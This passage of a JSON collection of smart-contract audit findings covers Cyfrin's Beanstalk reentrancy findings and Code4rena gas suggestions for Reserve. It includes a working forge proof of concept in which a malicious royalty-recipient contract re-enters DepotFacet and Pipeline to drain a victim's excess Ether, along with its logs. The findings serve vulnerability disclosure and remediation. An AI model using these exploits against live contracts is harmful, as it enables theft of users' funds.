after: \", VICTIM.balance);\n        emit log_named_uint(\"BEANSTALK balance after: \", BEANSTALK.balance);\n        emit log_named_uint(\"Exploiter balance after: \", address(exploiter).balance);\n    }\n}\n```\n\nAs can be seen in the output below, the exploiter is able to steal the excess 10 Ether sent by the victim:\n\n```\nRunning 1 test for test/FarmFacetPoC.t.sol:FarmFacetPoC\n[PASS] test_attack() (gas: 183060)\nLogs:\n  VICTIM balance before: : 10000000000000000000\n  BEANSTALK balance before: : 0\n  Exploiter balance before: : 1\n  data.length: 1\n  entered __doSafeTransferAcceptanceCheck\n  to is contract, calling hook\n  entered exploiter onERC1155Received\n  exploiting farm facet farm call\n  data.length: 0\n  entered exploiter fallback\n  Beanstalk balance:  0\n  Exploiter balance:  10000000000000000001\n  finished exploiting farm facet farm call\n  VICTIM balance after: : 0\n  BEANSTALK balance after: : 0\n  Exploiter balance after: : 10000000000000000001\n```\n\n**Recommended Mitigation:** Add a reentrancy guard to `FarmFacet` Farm functions.\n\n\\clearpage",
      "summary": "\nThe FarmFacet in Beanstalk allows for multiple functions to be called in one transaction, but it has a vulnerability that can be exploited by malicious external contracts. This can result in the draining of funds from the Diamond proxy. This vulnerability has been given a HIGH severity rating. To mitigate this issue, a reentrancy guard should be added to the FarmFacet Farm functions. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31196",
      "title": "Intermediate value sent by the caller can be drained via reentrancy when `Pipeline` execution is handed off to an untrusted external contract",
      "impact": "HIGH",
      "content": "**Description:** Pipeline is a utility contract created by the Beanstalk Farms team that enables the execution of an arbitrary number of valid actions in a single transaction. The `DepotFacet` is a wrapper around Pipeline for use within the Beanstalk Diamond proxy. When utilizing Pipeline through the `DepotFacet`, Ether value is first loaded by a payable call to the Diamond proxy fallback function, which then delegates execution to the logic of the respective facet function. Once the [`DepotFacet::advancedPipe`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/DepotFacet.sol#L55-L62) is called, for example, value is forwarded on to a [function of the same name](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L57-L66) within Pipeline.\n\n```solidity\nfunction advancedPipe(AdvancedPipeCall[] calldata pipes, uint256 value)\n    external\n    payable\n    returns (bytes[] memory results)\n{\n    results = IPipeline(PIPELINE).advancedPipe{value: value}(pipes);\n    LibEth.refundEth();\n}\n```\n\nThe important point to note here is that rather than sending the full Ether amount received by the Diamond proxy, the amount sent to Pipeline is equal to that of the `value` argument above, necessitating the use of [`LibEth::refundEth`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibEth.sol#L16-L26), which itself transfers the entire proxy Ether balance to the caller, following the call to return any unspent Ether.\n\n```solidity\nfunction refundEth()\n    internal\n{\n    AppStorage storage s = LibAppStorage.diamondStorage();\n    if (address(this).balance > 0 && s.isFarm != 2) {\n        (bool success, ) = msg.sender.call{value: address(this).balance}(\n            new bytes(0)\n        );\n        require(success, \"Eth transfer Failed.\");\n    }\n}\n```\n\nThis logic appears to be correct and work as intended; however, issues can arise due to the lack of reentrancy guard on `DepotFacet` and `Pipeline` functions. Given the nature of Pipeline calls to potentially untrusted external contracts, which themselves may also hand off execution to their own set of untrusted external contracts, this can become an issue if a malicious contract calls back into Beanstalk and/or Pipeline.\n\n```solidity\nfunction advancedPipe(AdvancedPipeCall[] calldata pipes)\n    external\n    payable\n    override\n    returns (bytes[] memory results) {\n        results = new bytes[](pipes.length);\n        for (uint256 i = 0; i < pipes.length; ++i) {\n            results[i] = _advancedPipe(pipes[i], results);\n        }\n    }\n```\n\nContinuing with the example of `DepotFacet::advancedPipe`, say, for example, one of the pipe calls involves an NFT mint/transfer in which some external contract is paid royalties in the form of a low-level call with ETH attached or some safe transfer check hands-off execution in this way, the malicious recipient could initiate a call to the Beanstalk Diamond which once again triggers `DepotFacet::advancedPipe` but this time with an empty `pipes` array. Given the implementation of `Pipeline::advancedPipe` above, this will simply return an empty bytes array and fall straight through to the ETH refund. Since the proxy balance is non-zero, assuming `value != msg.value` in the original call, this `msg.value - value` difference will be transferred to the malicious caller. Once execution returns to the original context and the original caller's transaction is nearing completion, the contract will no longer have any excess ETH, even though it is the original caller who should have received a refund of unspent funds.\n\nThis finding also applies to `Pipeline` itself, in which a malicious contract can similarly reenter Pipeline and utilize intermediate Ether balance without sending any value of their own. For example, given `getEthValue` does not validate the [clipboard value](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L95C17-L95C22) against the payable value (likely due to its current usage within a loop), `Pipeline::advancedPipe` could be called with a single `AdvancedPipeCall` with [normal pipe encoding](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L99) which calls another address owned by the attacker, again forwarding all remaining Ether given they are able to control the `value` parameter. It is, of course, feasible that the original caller attempts to perform some other more complicated pipes following the first, which may revert with 'out of funds' errors, causing the entire advanced pipe call to fail if no tolerant mode behavior is implemented on the target contract, so the exploiter would need to be strategic in these scenarios if they wish to elevate they exploit from denial-of-service to the stealing of funds.\n\n**Impact:** A malicious external contract handed control of execution during the lifetime of a Pipeline call can reenter and steal intermediate user funds. As such, this finding is determined to be of **HIGH** severity.\n\n**Proof of Concept:** The following forge test demonstrates the ability of an NFT royalty recipient, for example, to re-enter both Beanstalk and Pipeline, draining funds remaining in the Diamond and Pipeline that should have been refunded to/utilized by the original caller at the end of execution:\n\n```solidity\ncontract DepotFacetPoC is Test {\n    RoyaltyRecipient exploiter;\n    address exploiter1;\n    DummyNFT dummyNFT;\n    address victim;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", ATTACK_BLOCK);\n\n        exploiter = new RoyaltyRecipient();\n        dummyNFT = new DummyNFT(address(exploiter));\n        victim = makeAddr(\"victim\");\n        vm.deal(victim, 10 ether);\n\n        exploiter1 = makeAddr(\"exploiter1\");\n        console.log(\"exploiter1: \", exploiter1);\n\n        address _pipeline = address(new Pipeline());\n        vm.etch(PIPELINE, _pipeline.code);\n\n        vm.label(BEANSTALK, \"Beanstalk Diamond\");\n        vm.label(address(dummyNFT), \"DummyNFT\");\n        vm.label(address(exploiter), \"Exploiter\");\n    }\n\n    function test_attack() public {\n        emit log_named_uint(\"Victim balance before: \", victim.balance);\n        emit log_named_uint(\"BEANSTALK balance before: \", BEANSTALK.balance);\n        emit log_named_uint(\"PIPELINE balance before: \", PIPELINE.balance);\n        emit log_named_uint(\"DummyNFT balance before: \", address(dummyNFT).balance);\n        emit log_named_uint(\"Exploiter balance before: \", address(exploiter).balance);\n        emit log_named_uint(\"Exploiter1 balance before: \", exploiter1.balance);\n\n        vm.startPrank(victim);\n        AdvancedPipeCall[] memory pipes = new AdvancedPipeCall[](1);\n        pipes[0] = AdvancedPipeCall(address(dummyNFT), abi.encodePacked(dummyNFT.mintNFT.selector), abi.encodePacked(bytes1(0x00), bytes1(0x01), uint256(1 ether)));\n        IBeanstalk(BEANSTALK).advancedPipe{value: 10 ether}(pipes, 4 ether);\n        vm.stopPrank();\n\n        emit log_named_uint(\"Victim balance after: \", victim.balance);\n        emit log_named_uint(\"BEANSTALK balance after: \", BEANSTALK.balance);\n        emit log_named_uint(\"PIPELINE balance after: \", PIPELINE.balance);\n        emit log_named_uint(\"DummyNFT balance after: \", address(dummyNFT).balance);\n        emit log_named_uint(\"Exploiter balance after: \", address(exploiter).balance);\n        emit log_named_uint(\"Exploiter1 balance after: \", exploiter1.balance);\n    }\n}\n\ncontract DummyNFT {\n    address immutable i_royaltyRecipient;\n    constructor(address royaltyRecipient) {\n        i_royaltyRecipient = royaltyRecipient;\n    }\n\n    function mintNFT() external payable returns (bool success) {\n        // imaginary mint/transfer logic\n        console.log(\"minting/transferring NFT\");\n        // console.log(\"msg.value: \", msg.value);\n\n        // send royalties\n        uint256 value = msg.value / 10;\n        console.log(\"sending royalties\");\n        (success, ) = payable(i_royaltyRecipient).call{value: value}(\"\");\n    }\n}\n\ncontract RoyaltyRecipient {\n    bool exploited;\n    address constant exploiter1 = 0xDE47CfF686C37d501AF50c705a81a48E16606F08;\n\n    fallback() external payable {\n        console.log(\"entered exploiter fallback\");\n        console.log(\"Beanstalk balance: \", BEANSTALK.balance);\n        console.log(\"Pipeline balance: \", PIPELINE.balance);\n        console.log(\"Exploiter balance: \", address(this).balance);\n        if (!exploited) {\n            exploited = true;\n            console.log(\"exploiting depot facet advanced pipe\");\n            IBeanstalk(BEANSTALK).advancedPipe(new AdvancedPipeCall[](0), 0);\n            console.log(\"exploiting pipeline advanced pipe\");\n            AdvancedPipeCall[] memory pipes = new AdvancedPipeCall[](1);\n            pipes[0] = AdvancedPipeCall(address(exploiter1), \"\", abi.encodePacked(bytes1(0x00), bytes1(0x01), uint256(PIPELINE.balance)));\n            IPipeline(PIPELINE).advancedPipe(pipes);\n        }\n    }\n}\n\n```\nAs can be seen in the output below, the exploiter is able to net 9 additional Ether at the expense of the victim:\n```\nRunning 1 test for test/DepotFacetPoC.t.sol:DepotFacetPoC\n[PASS] test_attack() (gas: 182190)\nLogs:\n  exploiter1:  0xDE47CfF686C37d501AF50c705a81a48E16606F08\n  Victim balance before: : 10000000000000000000\n  BEANSTALK balance before: : 0\n  PIPELINE balance before: : 0\n  DummyNFT balance before: : 0\n  Exploiter balance before: : 0\n  Exploiter1 balance before: : 0\n  entered pipeline advanced pipe\n  msg.value:  4000000000000000000\n  minting/transferring NFT\n  sending royalties\n  entered exploiter fallback\n  Beanstalk balance:  6000000000000000000\n  Pipeline balance:  3000000000000000000\n  Exploiter balance:  100000000000000000\n  exploiting depot facet advanced pipe\n  entered pipeline advanced pipe\n  msg.value:  0\n  entered exploiter fallback\n  Beanstalk balance:  0\n  Pipeline balance:  3000000000000000000\n  Exploiter balance:  6100000000000000000\n  exploiting pipeline advanced pipe\n  entered pipeline advanced pipe\n  msg.value:  0\n  Victim balance after: : 0\n  BEANSTALK balance after: : 0\n  PIPELINE balance after: : 0\n  DummyNFT balance after: : 900000000000000000\n  Exploiter balance after: : 6100000000000000000\n  Exploiter1 balance after: : 3000000000000000000\n```\n\n**Recommended Mitigation:** Add reentrancy guards to both the `DepotFacet` and `Pipeline`. Also, consider validating clipboard Ether values in `Pipeline::_advancedPipe` against the payable function value in `Pipeline::advancedPipe`.",
      "summary": "\nThe Beanstalk Farms team has created a utility contract called Pipeline that allows for multiple actions to be executed in one transaction. However, there is a vulnerability in the `DepotFacet` wrapper that could allow malicious external contracts to re-enter and steal funds during a Pipeline call. This is due to a lack of reentrancy guards in both the `DepotFacet` and `Pipeline` functions. The severity of this issue is considered to be high. A proof of concept has been provided to demonstrate this vulnerability. To mitigate this issue, it is recommended to add reentrancy guards and validate clipboard Ether values in the Pipeline contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "27393",
      "title": "[G-15] Using this to access functions results in an external call, wasting gas",
      "impact": "GAS",
      "content": "External calls have an overhead of 100 gas, which can be avoided by not referencing the function using this. Contracts are [allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from external to public, so make this change if it's required in order to call the function internally.\n\nHere are some of the instances entailed:\n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/AppreciatingFiatCollateral.sol#L104\n\n```solidity\n        try this.tryPrice() returns (uint192 low, uint192 high, uint192 pegPrice) {\n```\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/Asset.sol\n\n```solidity\n89:        try this.tryPrice() returns (uint192 low, uint192 high, uint192) {\n\n113:        try this.tryPrice() returns (uint192 low, uint192 high, uint192) {\n\n129:        try this.tryPrice() returns (uint192 low, uint192 high, uint192) {\n```\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27392",
      "title": "[G-14] Reduce gas usage by moving to Solidity 0.8.19 or later",
      "impact": "GAS",
      "content": "Please visit the following link for substantiated details:\n\nhttps://soliditylang.org/blog/2023/02/22/solidity-0.8.19-release-announcement/#preventing-dead-code-in-runtime-bytecode\n\nAnd, here are some of the instances entailed:\n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/aave/StaticATokenLM.sol#L2\n\n```solidity\npragma solidity 0.6.12;\n```\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/aave/StaticATokenErrors.sol\n\n```solidity\npragma solidity 0.6.12;\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27391",
      "title": "[G-13] Use assembly for small keccak256 hashes, in order to save gas",
      "impact": "GAS",
      "content": "If the arguments to the encode call can fit into the scratch space (two words or fewer), then it's more efficient to use assembly to generate the hash (80 gas): keccak256(abi.encodePacked(x, y)) -> assembly {mstore(0x00, a); mstore(0x20, b); let hash := keccak256(0x00, 0x40); }\n\nHere are some of the instances entailed:\n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/aave/StaticATokenLM.sol#L285-L286\n\n```solidity\n                    keccak256(bytes(name())),\n                    keccak256(EIP712_REVISION),\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27390",
      "title": "[G-12] Constructors can be marked payable",
      "impact": "GAS",
      "content": "Payable functions cost less gas to execute, since the compiler does not have to add extra checks to ensure that a payment wasn't provided. A constructor can safely be marked as payable, since only the deployer would be able to pass funds, and the project itself would not pass any funds.\n\nHere are some of the instances entailed:\n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/aave/ATokenFiatCollateral.sol#L42\n\n```solidity\n    constructor(CollateralConfig memory config, uint192 revenueHiding)\n```\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/EURFiatCollateral.sol#L23-L27\n\n```solidity\n    constructor(\n        CollateralConfig memory config,\n        AggregatorV3Interface targetUnitChainlinkFeed_,\n        uint48 targetUnitOracleTimeout_\n    ) FiatCollateral(config) {\n```\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/FiatCollateral.sol#L62-L70\n\n```solidity\n    constructor(CollateralConfig memory config)\n        Asset(\n            config.priceTimeout,\n            config.chainlinkFeed,\n            config.oracleError,\n            config.erc20,\n            config.maxTradeVolume,\n            config.oracleTimeout\n        )\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27389",
      "title": "[G-11] Activate the optimizer",
      "impact": "GAS",
      "content": "Before deploying your contract, activate the optimizer when compiling using `solc --optimize --bin sourceFile.sol`. By default, the optimizer will optimize the contract assuming it is called 200 times across its lifetime. If you want the initial contract deployment to be cheaper and the later function executions to be more expensive, set it to `--optimize-runs=1`. Conversely, if you expect many transactions and do not care for higher deployment cost and output size, set `--optimize-runs` to a high number.\n\n```\nmodule.exports = {\nsolidity: {\nversion: \"0.8.19\",\nsettings: {\n  optimizer: {\n    enabled: true,\n    runs: 1000,\n  },\n},\n},\n};\n```\nPlease visit the following site for further information:\n\nhttps://docs.soliditylang.org/en/v0.5.4/using-the-compiler.html#using-the-commandline-compiler\n\nHere's one example of instance on opcode comparison that delineates the gas saving mechanism:\n\n```\nfor !=0 before optimization\nPUSH1 0x00\nDUP2\nEQ\nISZERO\nPUSH1 [cont offset]\nJUMPI\n\nafter optimization\nDUP1\nPUSH1 [revert offset]\nJUMPI\n```\nDisclaimer: There have been several bugs with security implications related to optimizations. For this reason, Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten -generated solc-js compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. Please measure the gas savings from optimizations, and carefully weigh them against the possibility of an optimization-related bug. Also, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27388",
      "title": "[G-10] Function order affects gas consumption",
      "impact": "GAS",
      "content": "The order of function will also have an impact on gas consumption. Because in smart contracts, there is a difference in the order of the functions. Each position will have an extra 22 gas. The order is dependent on method ID. So, if you rename the frequently accessed function to more early method ID, you can save gas cost. Please visit the following site for further information:\n\nhttps://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27387",
      "title": "[G-09] `+=` and `-=` cost more gas",
      "impact": "GAS",
      "content": "`+=` and `-=` generally cost 22 more gas than writing out the assigned equation explicitly. The amount of gas wasted can be quite sizable when repeatedly operated in a loop.\n\nFor instance, the `+=` instance below may be refactored as follows:\n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/compoundv3/CusdcV3Wrapper.sol#L307\n\n```diff\n-            baseSupplyIndex_ += safe64(mulFactor(baseSupplyIndex_, supplyRate * timeDelta));\n+            baseSupplyIndex_ = baseSupplyIndex_ + safe64(mulFactor(baseSupplyIndex_, supplyRate * timeDelta));\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27386",
      "title": "[G-08] Use of named returns for local variables saves gas",
      "impact": "GAS",
      "content": "You can have further advantages in terms of gas cost by simply using named return values as temporary local variables.\n\nFor instance, the code block below may be refactored as follows:\n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/compoundv3/CusdcV3Wrapper.sol#L225\n\n```diff\n-    function underlyingBalanceOf(address account) public view returns (uint256) {\n+    function underlyingBalanceOf(address account) public view returns (uint256 _balance) {\n        uint256 balance = balanceOf(account);\n        if (balance == 0) {\n            return 0;\n        }\n-        return convertStaticToDynamic(safe104(balance));\n+        _balance = convertStaticToDynamic(safe104(balance));\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27385",
      "title": "[G-07] Unneeded ternary logic, booleans, and second condition checks",
      "impact": "GAS",
      "content": "In the constructor of PoolTokens.sol, the second condition of the following require statement mandates that at least one feed is associated with each token.\n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/curve/PoolTokens.sol#L106-L109\n\n```solidity\n        require(\n            config.feeds.length == config.nTokens && minFeedsLength(config.feeds) > 0,\n            \"each token needs at least 1 price feed\"\n        );\n```\nAdditionally, the following code lines signify that a minimum of 2 tokens will be associated with the Curve base pool. Otherwise, if `nTokens` is less than 2 or 1, assigning `token0` and/or `token1` will revert due to accessing out-of-bound array elements. \n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/curve/PoolTokens.sol#L132-L135\n\n```solidity\n        token0 = tokens[0];\n        token1 = tokens[1];\n        token2 = (nTokens > 2) ? tokens[2] : IERC20Metadata(address(0));\n        token3 = (nTokens > 3) ? tokens[3] : IERC20Metadata(address(0));\n```\nUnder this context, the following ternary logic along with the use of boolean `more` is therefore deemed unnecessary.\n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/curve/PoolTokens.sol#L143-L154\n\n```diff\n        // token0\n-        bool more = config.feeds[0].length > 0;\n        // untestable:\n        //     more will always be true based on previous feeds validations\n-        _t0feed0 = more ? config.feeds[0][0] : AggregatorV3Interface(address(0));\n+        _t0feed0 = config.feeds[0][0];\n        _t0timeout0 = more && config.oracleTimeouts[0].length > 0 ? config.oracleTimeouts[0][0] : 0;\n        _t0error0 = more && config.oracleErrors[0].length > 0 ? config.oracleErrors[0][0] : 0;\n-        if (more) {\n            require(address(_t0feed0) != address(0), \"t0feed0 empty\");\n            require(_t0timeout0 > 0, \"t0timeout0 zero\");\n            require(_t0error0 < FIX_ONE, \"t0error0 too large\");\n-        }\n```\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/curve/PoolTokens.sol#L166-L177\n\n```diff\n        // token1\n        // untestable:\n        //     more will always be true based on previous feeds validations\n-        more = config.feeds[1].length > 0;\n-        _t1feed0 = more ? config.feeds[1][0] : AggregatorV3Interface(address(0));\n+        _t1feed0 = config.feeds[1][0];\n        _t1timeout0 = more && config.oracleTimeouts[1].length > 0 ? config.oracleTimeouts[1][0] : 0;\n        _t1error0 = more && config.oracleErrors[1].length > 0 ? config.oracleErrors[1][0] : 0;\n-        if (more) {\n            require(address(_t1feed0) != address(0), \"t1feed0 empty\");\n            require(_t1timeout0 > 0, \"t1timeout0 zero\");\n            require(_t1error0 < FIX_ONE, \"t1error0 too large\");\n-        }\n```\nSimilarly, the following second conditional checks are also not needed.\n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/curve/PoolTokens.sol#L189-L190\n\n```diff\n        // token2\n-        more = config.feeds.length > 2 && config.feeds[2].length > 0;\n+        more = config.feeds.length > 2;\n```\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/curve/PoolTokens.sol#L210-L211\n\n```diff\n        // token3\n-        more = config.feeds.length > 3 && config.feeds[3].length > 0;\n+        more = config.feeds.length > 3;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27384",
      "title": "[G-06] Identical for loop check",
      "impact": "GAS",
      "content": "The if block in the constructor of PoolTokens.sol entails identical if block checks that may be moved outside the loop to save gas.\n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/curve/PoolTokens.sol#L123-L130\n\n```diff\n        IERC20Metadata[] memory tokens = new IERC20Metadata[](nTokens);\n\n+        if (config.poolType == CurvePoolType.Plain) revert(\"invalid poolType\");\n\n        for (uint8 i = 0; i < nTokens; ++i) {\n-            if (config.poolType == CurvePoolType.Plain) {\n                tokens[i] = IERC20Metadata(curvePool.coins(i));\n-            } else {\n-                revert(\"invalid poolType\");\n-            }\n        }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27383",
      "title": "[G-05] Cached variables not efficiently used",
      "impact": "GAS",
      "content": "In `StaticATokenLM._updateRewards`, the state variable `_lifetimeRewardsClaimed` is doubly used in the following code logic when `rewardsAccrued` could simply/equally be assigned `freshRewards.wadToRay()`. This extra gas incurring behaviour is also exhibited in [`StaticATokenLM._collectAndUpdateRewards`](https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/aave/StaticATokenLM.sol#L428-L434), and [`StaticATokenLM._getPendingRewards`](https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/aave/StaticATokenLM.sol#L581-L583).\n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/aave/StaticATokenLM.sol#L406-L408\n\n```diff\n            uint256 freshRewards = INCENTIVES_CONTROLLER.getRewardsBalance(assets, address(this));\n            uint256 lifetimeRewards = _lifetimeRewardsClaimed.add(freshRewards);\n-            uint256 rewardsAccrued = lifetimeRewards.sub(_lifetimeRewards).wadToRay();\n+            uint256 rewardsAccrued = freshRewards.wadToRay();\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27382",
      "title": "[G-04] Unneeded import in `RTokenAsset.sol`",
      "impact": "GAS",
      "content": "`IRToken.sol` has already been imported by `IMain.sol`, making the former an unneeded import. \n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/RTokenAsset.sol#L5-L6\n\n```diff\n import \"../../interfaces/IMain.sol\";\n- import \"../../interfaces/IRToken.sol\";\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27381",
      "title": "[G-03] Redundant `return` in the `try` clause",
      "impact": "GAS",
      "content": "This `try` clause has already returned `low` and `high` and is returning the same things again in its nested logic, which is inexpedient and unnecessary. Similar behavior is also found in [`Asset.price`](https://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/Asset.sol#L112-L121). \n\nhttps://github.com/reserve-protocol/protocol/blob/9ee60f142f9f5c1fe8bc50eef915cf33124a534f/contracts/plugins/assets/RTokenAsset.sol#L86-L94\n\n```diff\n    function price() public view virtual returns (uint192, uint192) {\n        try this.tryPrice() returns (uint192 low, uint192 high) {\n-            return (low, high);\n        } catch (bytes memory errData) {\n            // see: docs/solidity-style.md#Catching-Empty-Data\n            if (errData.length == 0) revert(); // solhint-disable-line reason-string\n            return (0, FIX_MAX);\n        }\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-07-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27380",
      "title": "[G-02] Unreachable code lines",
      "impact": "GAS",
